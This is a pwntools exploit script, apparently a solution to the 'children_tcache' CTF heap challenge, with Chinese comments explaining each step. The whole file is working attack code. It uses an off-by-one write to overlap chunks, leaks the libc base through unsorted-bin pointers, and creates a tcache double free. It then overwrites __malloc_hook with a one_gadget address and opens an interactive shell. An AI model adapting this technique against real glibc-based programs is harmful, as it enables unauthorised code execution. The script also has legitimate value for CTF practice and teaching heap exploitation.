from pwn import *

context.log_level = 'debug'

p = process("./children_tcache")
elf = ELF("./libc.so.6")
#one_gadget = 0x4f2c5
one_gadget = 0x10a38c	

def add(size,data):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(data)
    

def show(idx):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def add_7(size):
    for i in range(0,7):
        add(size,'a'*0x10)

def del_7():
    for i in range(0,7):
        delete(i)

if __name__=='__main__':

    add_7(0x80)
    del_7()  #防止后面delete(0x80)后，进入tcache，overlapping合并时会报错
    
    add_7(0x100) #让8和7进入unsorted bin

    add(0x108,'a'*0x10) #7 ->chunk A
    add(0x100,'a'*0x10) #8 ->chunk B
    add(0x100,'a'*0x10) #9 ->chunk C

    del_7()
       
    delete(8)
    delete(7) # 合并成一个unsorted bin 
#--------------
    add_7(0x108) 

    add(0x108,'b'*0x108)#7 重新分配到7，并进行off by one 覆盖下一个chunk的size 0x111->0x100，创建了last_remainder

    del_7()
#-------------
    add_7(0x80)
    
    add(0x80,'c'*0x10)#8 ->chunk b1，将chunk B重新申请 分成 chunk b1和chunk b2

    del_7()

    add(0x60,'d'*0x10)#0 leak chunk ->chunk b2

    delete(8) #释放chunk b1
    delete(9) #释放chunk C，获得top chunk，位于chunk b1的位置

    add(0x30,'1'*0x10) #1 申请chunk b1，分成两次申请，不然会在tcache中申请，无法申请到chunk b1
    add(0x40,'2'*0x10) #2
    add(0x500,'3'*0x10) #3 the same as chunk 0 ，进入unsorted bin
    add(0x150,'4'*0x10) #4 防止释放chunk 3时被top chunk 合并
    delete(3)
    show(0) #chunk 3释放后会在fd和bk上填充main_arena+96的地址，并且chunk 0和chunk 3的地址一样
    malloc_hook = elf.symbols['__malloc_hook']
    libc_base = u64(p.recv(6).ljust(8,'\0'))-96-0x10-malloc_hook
    print hex(libc_base)

    one_gadget = libc_base+one_gadget
    malloc_hook = libc_base+malloc_hook
    
    #-----double free

    add(0x60,'e'*0x10) #3 之前的chunk 3在unsorted bin中，需要重新申请，释放后放在tcache中
    delete(3)
    delete(0) #构造double free

    add(0x60,p64(malloc_hook)*4)  #修改fd为malloc_hook
    add(0x60,'e'*0x10)
    add(0x60,p64(one_gadget)) #修改malloc_hook为one_gadget

    #手动输入进行add操作，getshell

    p.interactive()
